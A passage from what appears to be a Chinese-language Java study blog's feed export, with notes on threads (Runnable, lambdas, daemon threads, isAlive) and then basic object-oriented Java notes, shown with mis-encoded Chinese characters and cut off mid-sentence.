&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ä½¿ç”¨Runnableå’Œç›´æ¥ç»§æ‰¿Threadä¹‹é—´çš„ä¸»è¦åŒºåˆ«"><a href="#ä½¿ç”¨Runnableå’Œç›´æ¥ç»§æ‰¿Threadä¹‹é—´çš„ä¸»è¦åŒºåˆ«" class="headerlink" title="ä½¿ç”¨Runnableå’Œç›´æ¥ç»§æ‰¿Threadä¹‹é—´çš„ä¸»è¦åŒºåˆ«"></a>ä½¿ç”¨Runnableå’Œç›´æ¥ç»§æ‰¿Threadä¹‹é—´çš„ä¸»è¦åŒºåˆ«</h5><p><strong>è§£è€¦åˆ</strong>ï¼ˆä½¿ç”¨åå°„ å„ä¸ªåŠŸèƒ½ä»£ç ä¸èƒ½äº¤å‰ ç¼–å†™å°é—­çš„ä»£ç ï¼‰</p><p>æ¨¡å—é—´çš„å…³ç³»è¶Šå¯†åˆ‡ï¼Œè€¦åˆæ€§è¶Šå¼ºï¼Œè¶Šç‹¬ç«‹.<br>æ¯”å¦‚æˆ‘å»æ±‰å ¡åº—æ‰“å·¥ï¼Œè´Ÿè´£åšç¾å‘³èŸ¹é»„å ¡ï¼Œå®¢äººå¤ªå¤šï¼ŒBossåˆæ‹›æ–°äººè´Ÿè´£åˆ†æ‹…ç›¸åŒçš„å·¥ä½œï¼ŒBossç”µè„‘è¢«é»‘äº†ï¼Œå‘˜å·¥é‡Œåªæœ‰æˆ‘æŒæ¡äº†ç›¸å…³æŠ€æœ¯ï¼Œé‚£å°±åªæœ‰æˆ‘èƒ½è§£å†³é—®é¢˜.</p><p>åšç¾å‘³èŸ¹é»„å ¡æ˜¯ä¸€ä¸ªä»»åŠ¡ï¼Œæˆ‘åšæˆ–è€…æ–°å‘˜å·¥åšæœ¬è´¨ä¸Šæ²¡æœ‰åŒºåˆ«.å¯ä»¥æŠŠæ­¤ä»»åŠ¡å•ç‹¬æå–æˆRunnableï¼Œå¯ä»¥è°ƒæ•´æ‰§è¡Œ.</p><p>åå…¥ä¾µåªæœ‰æˆ‘èƒ½æ¥åšï¼Œæ­¤ä»»åŠ¡å°±æ˜¯å’Œæˆ‘æœ‰è€¦åˆå…³ç³».<br>ä¸¤ä¸ªä»»åŠ¡æˆ‘éƒ½å¯ä»¥åšï¼Œé‚£å°±æ˜¯è¶…çº§åŠ å€ï¼ï¼ˆbushiï¼‰ä¸åº—é¢æ­£å¸¸è¿è½¬è¿™ä¸ªä»»åŠ¡çš„è€¦åˆåº¦æ›´é«˜.</p><h4 id="åŸºäºlambdaè¡¨è¾¾å¼ï¼ˆæ¨èï¼‰"><a href="#åŸºäºlambdaè¡¨è¾¾å¼ï¼ˆæ¨èï¼‰" class="headerlink" title="åŸºäºlambdaè¡¨è¾¾å¼ï¼ˆæ¨èï¼‰"></a>åŸºäºlambdaè¡¨è¾¾å¼ï¼ˆæ¨èï¼‰</h4><p>Javaä¸­ä¸å…è®¸å‡½æ•°ç‹¬ç«‹å­˜åœ¨ï¼ˆå…¶ä»–è¯­è¨€å‡½æ•°å« functioin javaä¸­å«methodæ–¹æ³•ï¼‰<br>lambda æ›´ç®€åŒ–çš„è¯­æ³•è¡¨ç¤ºæ–¹å¼ â€œè¯­æ³•ç³–â€ã€ä¾‹å¦‚ for each forï¼ˆint x: arrï¼‰ ã€‘<br>ç›¸å½“äºåŒ¿åå†…éƒ¨ç±»çš„ç®€å•å†™æ³•<br>lambda æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆå‡½æ•°å¼æ¥å£ æœªè„±ç¦»ç±»ï¼‰ ä¸»è¦ç”¨æ¥å®ç°â€å›è°ƒå‡½æ•°â€œçš„æ•ˆæœ</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Thread t = <span class="keyword">new</span> Thread(<span class="function"><span class="params">()</span> -&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo5</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            t.start();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;hello main&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="å›è°ƒå‡½æ•°"><a href="#å›è°ƒå‡½æ•°" class="headerlink" title="å›è°ƒå‡½æ•°"></a>å›è°ƒå‡½æ•°</h4><p>æ˜¯çš„ æˆ‘ä»¬çš„çš‡å¸é—è¯ï¼ˆbushiï¼‰<br>éä¸»åŠ¨è°ƒç”¨ä¹Ÿéç«‹å³è°ƒç”¨ï¼Œåœ¨åˆé€‚çš„æ—¶æœºè¿›è¡Œæ‰§è¡Œ.<br><strong>é€šå¸¸ç”±æ“ä½œç³»ç»Ÿã€åº“ã€æ¡†æ¶ã€åˆ«äººå†™çš„ä»£ç è¿›è¡Œè°ƒç”¨</strong></p><h3 id="Threadçš„å¸¸è§æ„é€ æ–¹æ³•"><a href="#Threadçš„å¸¸è§æ„é€ æ–¹æ³•" class="headerlink" title="Threadçš„å¸¸è§æ„é€ æ–¹æ³•"></a>Threadçš„å¸¸è§æ„é€ æ–¹æ³•</h3><table><thead><tr><th align="center">æ–¹æ³•</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">Thread()</td><td align="center">åˆ›å»ºçº¿ç¨‹å¯¹è±¡</td></tr><tr><td align="center">Threadï¼ˆRunnable taegetï¼‰</td><td align="center">ä½¿ç”¨ Runnable å¯¹è±¡åˆ›å»ºçº¿ç¨‹å¯¹è±¡</td></tr><tr><td align="center">Threadï¼ˆString nameï¼‰</td><td align="center">åˆ›å»ºçº¿ç¨‹å¯¹è±¡ï¼Œå¹¶å‘½å</td></tr><tr><td align="center">Threadï¼ˆRunnable taegetï¼ŒString nameï¼‰</td><td align="center">ä½¿ç”¨ Runnable å¯¹è±¡åˆ›å»ºçº¿ç¨‹å¯¹è±¡ï¼Œå¹¶å‘½å</td></tr><tr><td align="center">Thread(ThreadGroup group, Runnable target)</td><td align="center">çº¿ç¨‹å¯ä»¥è¢«ç”¨æ¥åˆ†ç»„ç®¡ç†ï¼Œåˆ†å¥½çš„ç»„å³ä¸ºçº¿ç¨‹ç»„</td></tr></tbody></table><p>åˆ›å»ºçº¿ç¨‹çš„æ—¶å€™ å¯ä»¥å»æŒ‡å®šname<br>nameä¸å½±å“çº¿ç¨‹çš„æ‰§è¡Œ åªæ˜¯ä¸€ä¸ªå‘½å<br>æ–¹ä¾¿åç»­è°ƒè¯•åŒºåˆ†</p><p>çº¿ç¨‹çš„å…¥å£æ–¹æ³•æ‰§è¡Œç»“æŸ çº¿ç¨‹å°±è¢«é”€æ¯<br>å¯¹äºä¸»çº¿ç¨‹æ¥è¯´ å…¥å£æ–¹æ³•å°±æ˜¯mainæ–¹æ³• ï¼ˆä¾‹å¦‚ä¸Šè¿°t.startä¸€ç¬é—´å°±æ‰§è¡Œå®Œæ¯•ï¼‰</p><h3 id="Threadçš„å‡ ä¸ªå¸¸è§å±æ€§"><a href="#Threadçš„å‡ ä¸ªå¸¸è§å±æ€§" class="headerlink" title="Threadçš„å‡ ä¸ªå¸¸è§å±æ€§"></a>Threadçš„å‡ ä¸ªå¸¸è§å±æ€§</h3><table><thead><tr><th>å±æ€§</th><th>è·å–æ–¹æ³•</th></tr></thead><tbody><tr><td>ID</td><td>getIdï¼ˆï¼‰</td></tr><tr><td>åç§°</td><td>getName()</td></tr><tr><td>çŠ¶æ€</td><td>getState()</td></tr><tr><td>ä¼˜å…ˆçº§</td><td>getPriority()</td></tr><tr><td>æ˜¯å¦åå°çº¿ç¨‹</td><td>isDaemon()</td></tr><tr><td>æ˜¯å¦å­˜æ´»</td><td>isAlive()</td></tr><tr><td>æ˜¯å¦è¢«ä¸­æ–­</td><td>isInterrupted()</td></tr></tbody></table><h5 id="getIdï¼ˆï¼‰"><a href="#getIdï¼ˆï¼‰" class="headerlink" title="getIdï¼ˆï¼‰"></a>getIdï¼ˆï¼‰</h5><p>çº¿ç¨‹çš„èº«ä»½æ ‡è¯† æ ‡è¯†ä¸€ä¸ªè¿›ç¨‹ä¸­å”¯ä¸€çš„ä¸€ä¸ªçº¿ç¨‹<br>ï¼ˆè¿™ä¸ªidå¼Javaç»™è¿™ä¸ªçº¿ç¨‹åˆ†é…çš„ ä¸æ˜¯ç³»ç»Ÿapiæä¾›çš„çº¿ç¨‹id æ›´ä¸æ˜¯pcbä¸­çš„idï¼‰</p><h5 id="getPriorityï¼ˆï¼‰"><a href="#getPriorityï¼ˆï¼‰" class="headerlink" title="getPriorityï¼ˆï¼‰"></a>getPriorityï¼ˆï¼‰</h5><p>è™½ç„¶æä¾›api å¯ä»¥è·å¾—&#x2F;è®¾ç½®ä¼˜å…ˆçº§ ä½†å¾ˆéš¾è¢«å¯Ÿè§‰<br>ä¼˜å…ˆçº§å½±å“åˆ°çš„æ˜¯å¾®è§‚ä¸Šè¿›è¡Œçš„è°ƒåº¦</p><h5 id="isDaemonï¼ˆï¼‰"><a href="#isDaemonï¼ˆï¼‰" class="headerlink" title="isDaemonï¼ˆï¼‰"></a>isDaemonï¼ˆï¼‰</h5><h6 id="å®ˆæŠ¤çº¿ç¨‹ï¼ˆåå°çº¿ç¨‹ï¼‰"><a href="#å®ˆæŠ¤çº¿ç¨‹ï¼ˆåå°çº¿ç¨‹ï¼‰" class="headerlink" title="å®ˆæŠ¤çº¿ç¨‹ï¼ˆåå°çº¿ç¨‹ï¼‰"></a>å®ˆæŠ¤çº¿ç¨‹ï¼ˆåå°çº¿ç¨‹ï¼‰</h6><p>ä¸ç»“æŸä¸å½±å“æ•´ä¸ªè¿›ç¨‹çš„ç»“æŸ</p><h6 id="å‰å°çº¿ç¨‹"><a href="#å‰å°çº¿ç¨‹" class="headerlink" title="å‰å°çº¿ç¨‹"></a>å‰å°çº¿ç¨‹</h6><p>ä¸€ä¸ªJavaè¿›ç¨‹ä¸­ è‹¥å‰å°çº¿ç¨‹æœªæ‰§è¡Œç»“æŸ æ­¤æ—¶æ•´ä¸ªè¿›ç¨‹æ˜¯ä¸€å®šä¸ä¼šç»“æŸçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®¾ç½®tä¸ºåå°çº¿ç¨‹ ä¸€å®šåœ¨startä¹‹å‰</span></span><br><span class="line">t.setDaemon(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">t.start();</span><br></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹ä¸€ä¸ªçº¿ç¨‹æ˜¯å‰å°çº¿ç¨‹,æœªå¤„ç†çš„çº¿ç¨‹é»˜è®¤ä¸ºå‰å°çº¿ç¨‹<br>æ”¹æˆåå°çº¿ç¨‹ä¹‹å ä¸»è¿›ç¨‹é£å¿«çš„ç»“æŸ æ­¤æ—¶æ²¡æœ‰å…¶ä»–å‰å°çº¿ç¨‹ è¿›ç¨‹ç»“æŸ tæ¥ä¸åŠæ‰§è¡Œå°±å®Œäº†</p><h5 id="isAliveï¼ˆï¼‰"><a href="#isAliveï¼ˆï¼‰" class="headerlink" title="isAliveï¼ˆï¼‰"></a>isAliveï¼ˆï¼‰</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;çº¿ç¨‹å¼€å§‹&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;çº¿ç¨‹ç»“æŸ&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        System.out.println(t.isAlive());</span><br><span class="line">        t.start();</span><br><span class="line">        System.out.println(t.isAlive());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(t.isAlive());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ¤å®šå†…æ ¸ä¸­çš„çº¿ç¨‹æ˜¯ä¸æ˜¯è¢«é”€æ¯äº†ï¼ˆå›è°ƒæ–¹æ³•æ‰§è¡Œå®Œæ¯• çº¿ç¨‹å°±ç»“æŸäº†ï¼‰</p><p>Threadå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸ æ¯”ç³»ç»Ÿå†…æ ¸ä¸­çš„çº¿ç¨‹æ›´é•¿ä¸€äº›<br>Threadå¯¹è±¡è¿˜åœ¨ å†…æ ¸ä¸­çš„çº¿ç¨‹å·²ç»è¢«é”€æ¯<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812144335773.png" alt="image-20240812144335773"></p><p><strong>çº¿ç¨‹å¹¶å‘æ‰§è¡Œï¼Œå¹¶å‘é¡ºåºç”±ç³»ç»Ÿçš„è°ƒåº¦å™¨å†³å®šï¼Œä¸ç¡®å®š.</strong>(æç«¯æƒ…å†µå¯èƒ½ä¸»çº¿ç¨‹å¡æ–°çº¿ç¨‹å…ˆæ‰“å°)</p><p>æœªå®Œå¾…ç»­â€â€â€</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaåŸºç¡€çŸ¥è¯†æ‚è®°</title>
      <link href="/2024/06/22/Java%E6%9D%82%E8%AE%B0/"/>
      <url>/2024/06/22/Java%E6%9D%82%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Javaæ‚è®°"><a href="#Javaæ‚è®°" class="headerlink" title="Javaæ‚è®°"></a>Javaæ‚è®°</h2><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112541356.png" alt="image-20240203112541356"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112929728.png" alt="image-20240203112929728"></p><p>é™æ€æ–¹æ³•æ— æ³•ç»§æ‰¿ æ— å®ä¾‹åŒ–å¯¹è±¡</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112627335.png" alt="image-20240203112627335"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112645067.png"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112823024.png" alt="image-20240203112823024"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112834853.png" alt="image-20240203112834853"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112849352.png" alt="image-20240203112849352"></p><h4 id="å¼‚å¸¸"><a href="#å¼‚å¸¸" class="headerlink" title="å¼‚å¸¸"></a>å¼‚å¸¸</h4><p>æ•°ç»„ç´¢å¼•å¼‚å¸¸<br>ç©ºæŒ‡é’ˆå¼‚å¸¸<br>ç®—æ•°å¼‚å¸¸<br>ä¸¢å¤±èµ„æº<br>æ‰¾ä¸åˆ°ç±»<br>ç¼–è¯‘æ—¶å¼‚å¸¸</p><p>oop é¢å‘å¯¹è±¡çš„è¯­è¨€<br>å¯¹è±¡çš„æˆå‘˜å±æ€§åœ¨æœªèµ‹å€¼å‰<br>å¼•ç”¨ç±»å‹çš„é»˜è®¤å€¼æ˜¯NULL<br>è§åˆ°é‚£ç±»å‹ä¸ºå¯¹åº”çš„0</p><p><strong>é€šè¿‡thiså¯ä»¥è®¿é—®å½“å‰å¯¹è±¡çš„æˆå‘˜å±æ€§&#x2F;æˆå‘˜å˜é‡ï¼ˆé™æ€çš„æˆå‘˜å˜é‡ä¸æ”¯æŒï¼‰</strong></p><p>é»˜è®¤<br>int - 0<br>float - 0.0f<br>char - â€˜\u0000â€™<br>boolean - flase</p><h4 id="æ„é€ æ–¹æ³•"><a href="#æ„é€ æ–¹æ³•" class="headerlink" title="æ„é€ æ–¹æ³•"></a>æ„é€ æ–¹æ³•</h4><p>éç‰¹æ®Šçš„ä¸€ä¸ªæ–¹æ³•ï¼š<br>1.æ–¹æ³•åå¿…é¡»å’Œç±»åç›¸åŒ<br>2.æ²¡æœ‰è¿”å›å€¼<br>3.åˆ›å»ºå¯¹è±¡æ—¶ç”±ç¼–è¯‘å™¨è‡ªåŠ¨è°ƒç”¨</p><p><strong>å½“ä¸€ä¸ªç±»ä¸­æ²¡æœ‰ä»»ä½•ä¸€ä¸ªæ„é€ æ–¹æ³•æ—¶ javaä¼šè‡ªåŠ¨æä¾›ä¸€ä¸ªæ— å‚çš„æ„é€ æ–¹æ³•</strong></p><h4 id="æ„é€ æ–¹æ³•ä¹‹é—´å¯ä»¥å½¢æˆæ–¹æ³•çš„é‡è½½"><a href="#æ„é€ æ–¹æ³•ä¹‹é—´å¯ä»¥å½¢æˆæ–¹æ³•çš„é‡è½½" class="headerlink" title="æ„é€ æ–¹æ³•ä¹‹é—´å¯ä»¥å½¢æˆæ–¹æ³•çš„é‡è½½"></a>æ„é€ æ–¹æ³•ä¹‹é—´å¯ä»¥å½¢æˆæ–¹æ³•çš„é‡è½½</h4><p>1.æ–¹æ³•åç›¸åŒ<br>2.å‚æ•°åˆ—è¡¨ä¸åŒ</p><p><strong>æ„é€ æ–¹æ³•åªå¯¹å¯¹è±¡ä¸­çš„æˆå‘˜è¿›è¡Œåˆå§‹åŒ– ä¸è¿›è¡Œç©ºé—´åˆ†é…</strong></p><h4 id="å®Œæˆä¸€ä¸ªå¯¹è±¡çš„æ„é€ "><a href="#å®Œæˆä¸€ä¸ªå¯¹è±¡çš„æ„é€ " class="headerlink" title="å®Œæˆä¸€ä¸ªå¯¹è±¡çš„æ„é€ "></a>å®Œæˆä¸€ä¸ªå¯¹è±¡çš„æ„é€ </h4><p>1.åˆ†é…å†…å­˜<br>2.è°ƒç”¨åˆé€‚çš„æ„é€ æ–¹æ³•</p><p>thisï¼ˆï¼‰ï¼›è°ƒç”¨å½“å‰ç±»å½“ä¸­å…¶ä»–æ„é€ æ–¹æ³•<br>åªèƒ½åœ¨å½“å‰çš„æ„é€ æ–¹æ³•å†…éƒ¨è¿›è¡Œä½¿ç”¨<br>åªèƒ½æ”¾åœ¨ç¬¬ä¸€è¡Œ</p><p>this.dataè®¿é—®å½“å‰å¯¹è±¡çš„å±æ€§<br>this.funcï¼ˆï¼‰è°ƒç”¨å½“å‰å¯¹è±¡çš„æ–¹æ³•<br>thisæœ¬èº«ä»£è¡¨å½“å‰å¯¹è±¡çš„å¼•ç”¨</p><p>å°±åœ°åˆå§‹åŒ–<br>å£°æ˜æˆå‘˜å˜é‡çš„åŒæ—¶è¿›è¡Œåˆå§‹åŒ–<br>å³åœ¨classå†…è¿›è¡Œåˆå§‹åŒ–</p><h4 id="é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹æ€§"><a href="#é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹æ€§" class="headerlink" title="é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹æ€§"></a>é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹æ€§</h4><p>å°è£… privateä¿®é¥°<br>æ˜¯æ•°æ®å’Œæ“ä½œæ•°æ®çš„æ–¹æ³•è¿›è¡Œæœ‰æœºç»“åˆ éšè—å¯¹è±¡çš„å±æ€§å’Œå®ç°ç»†èŠ‚ ä»…å¯¹å¤–å…¬å¼€æ¥å£æ¥å’Œå¯¹è±¡è¿›è¡Œäº¤äº’<br>å¯¹ç±»çš„æˆå‘˜ è¿›è¡Œéšè— é€šè¿‡å…³é”®å­—private åªæ˜¯å¯¹ç±»å¯¹å¤–æä¾›å…¬å¼€çš„æ¥å£<br>æ„ä¹‰<br>å¯ä»¥éšè—çš„å®ç°ç»†èŠ‚ ä»è€Œè¾¾åˆ°å®‰å…¨æ€§<br>ç»§æ‰¿<br>å¤šæ€</p><h4 id="åŒ…"><a href="#åŒ…" class="headerlink" title="åŒ…"></a>åŒ…</h4><p>æ›´å¥½çš„ç®¡ç†ç±»<br>å¤šä¸ªç±»æ”¶é›†æˆä¸ºä¸€ç»„ å¯¹ç±»æˆ–æ¥å£å¾ˆå¥½çš„ç»„ç»‡æ–¹å¼<br>å¯¹ç±»ã€æ¥å£ç­‰å°è£…æœºåˆ¶çš„ä½“ç° </p><p>éé™æ€æˆå‘˜å˜é‡å±äºå¯¹è±¡ è®¿é—®æ–¹å¼ å¯¹è±¡çš„å¼•ç”¨.xxx<br>é™æ€æˆå‘˜å˜é‡çš„ä½¿ç”¨ ä¸ä¾èµ–äºå¯¹è±¡ï¼ˆä¸ç”¨å®ä¾‹åŒ– ã€newã€‘ï¼‰ç±»å.xxxx<br>é™æ€æˆå‘˜å˜é‡ï¼ˆç±»å˜é‡ï¼‰<br>é™æ€æ–¹æ³•  ï¼ˆç±»æ–¹æ³•ï¼‰</p><p>é™æ€æ–¹æ³•å†…éƒ¨ä¸èƒ½ç›´æ¥è°ƒç”¨éé™æ€æ–¹æ³•&#x2F;æˆå‘˜å˜é‡<br>staticæ–¹æ³•ä¸­ä¸èƒ½ä½¿ç”¨this<br>éœ€é€šè¿‡å¯¹è±¡çš„å¼•ç”¨è°ƒç”¨é™æ€æ–¹æ³•<br>å¯ä»¥é€šè¿‡ç±»åè¿›è¡Œè®¿é—®<br>è°ƒç”¨é™æ€æ–¹æ³•ä¸éœ€è¦å®ä¾‹å¯¹è±¡</p><p>å®ä¾‹</p><p>é™æ€ä»£ç å—&gt;å®ä¾‹ä»£ç å—&gt;æ„é€ ä»£ç å—<br>é™æ€ä»£ç å—åªæ‰§è¡Œä¸€æ¬¡</p><p>å®ä¾‹ä»£ç å—ä¸€å®šæ˜¯å®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™è¢«æ‰§è¡Œ</p><p>åœ¨javaä¸­ç±»çš„é™æ€å˜é‡ä¼šè¢«é»˜è®¤åˆå§‹åŒ–<br>æ„é€ æ–¹æ³•ä¸­å½¢å‚åå’Œæˆå‘˜å˜é‡åç›¸åŒ éœ€è¦ç”¨thisæŒ‡å®š<br>åœ¨ç±»å¤–ä½¿ç”¨éœ€è¦ä½¿ç”¨publicè®¿é—®ä¿®é¥°ç¬¦</p><p>staticåªèƒ½ä¿®é¥°æˆå‘˜å˜é‡ ä¸ä¿®é¥°å±€éƒ¨å˜é‡</p><h4 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h4><p>å½“å­ç±»å’Œçˆ¶ç±»æ˜¯åŒåæˆå‘˜å˜é‡ ä¼˜å…ˆè®¿é—®å­ç±»<br>è®¿é—®çˆ¶ç±»-&gt;superå…³é”®å­—<br>thisè®¿é—®æ—¢å¯ä»¥è®¿é—®çˆ¶ç±»ä¹Ÿå¯ä»¥è®¿é—®å­ç±»æˆå‘˜å˜é‡ åŒåæ—¶ ä¼˜å…ˆå­ç±»<br>superåªèƒ½è®¿é—®ä»çˆ¶ç±»ç»§æ‰¿è¿‡æ¥çš„æˆå‘˜å˜é‡<br>superåœ¨éé™æ€çš„æ–¹æ³•ä¸­ä½¿ç”¨<br>superå’Œthiså†æ„é€ æ–¹æ³•è°ƒç”¨æ—¶ éƒ½åªèƒ½æ”¾åœ¨ç¬¬ä¸€å¥ ä¸”ä¸èƒ½åŒæ—¶å‡ºç°</p><p>åœ¨ä¸åŒåŒ…ä¸­è®¿é—®çˆ¶å­é—´å…³ç³» protected<br>mainæ–¹æ³•ä¸ºé™æ€çš„ æ‰€ä»¥å…ˆåˆ›é€ ä¸€ä¸ªæ„é€ æ–¹æ³•<br>ä¸€ä¸ªç±»ä¸æƒ³è¢«ç»§æ‰¿ä½¿ç”¨finalå…³é”®å­—ä¿®é¥° </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">99</span>ï¼›</span><br><span class="line">&#125;<span class="comment">//å¯†å°ç±»</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span>å®šä¹‰ -&gt;å¸¸é‡</span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>ï¼›</span><br><span class="line">a = <span class="number">20</span>ï¼›</span><br></pre></td></tr></table></figure><p>ç»§æ‰¿ is-açš„å…³ç³»<br>ç»„åˆæ˜¯ has-a&#x2F;a part of çš„å…³ç³»</p><h4 id="å¤šæ€å®ç°æ¡ä»¶"><a href="#å¤šæ€å®ç°æ¡ä»¶" class="headerlink" title="å¤šæ€å®ç°æ¡ä»¶"></a>å¤šæ€å®ç°æ¡ä»¶</h4><p>å‘ä¸Šè½¬å‹<br>1.ç›´æ¥èµ‹å€¼<br>2.æ–¹æ³•ä¼ å‚çš„æ–¹å¼<br>3.è¿”å›å€¼<br>é€šè¿‡çˆ¶ç±»å¼•ç”¨ è°ƒç”¨è¿™ä¸ªçˆ¶ç±» 